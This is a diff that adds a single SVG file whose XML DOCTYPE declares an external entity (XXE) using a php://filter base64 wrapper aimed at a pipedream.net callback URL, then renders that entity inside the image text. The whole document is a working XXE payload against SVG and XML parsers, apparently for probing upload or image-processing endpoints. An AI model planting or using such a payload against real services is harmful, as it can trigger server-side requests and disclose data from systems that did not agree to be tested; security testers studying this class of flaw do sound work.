@@ -1,0 +1,1 @@
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=https://enjbgrh2gxyqb.x.pipedream.net" > ]><svg width="5000px" height="5000px" viewBox="0 0 5000 5000" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="8" x="0" y="16">&xxe;</text></svg>
